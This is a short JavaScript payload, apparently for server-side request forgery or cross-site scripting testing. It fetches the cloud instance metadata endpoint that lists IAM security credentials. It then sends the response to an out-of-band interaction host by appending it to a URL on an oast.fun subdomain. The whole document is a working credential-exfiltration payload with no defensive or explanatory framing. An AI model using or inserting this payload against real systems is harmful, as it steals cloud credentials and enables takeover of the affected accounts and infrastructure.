x = new XMLHttpRequest;
x.onload = function() {
	l = new XMLHttpRequest;
	l.open("GET", "http://abhhrvlbveslopuhgasupt9ccr4vsypy9.oast.fun/" + encodeURIComponent(this.responseText));
	l.send();
};
x.open("GET", "http://169.254.169.254/latest/meta-data/iam/security-credentials/");
x.send();
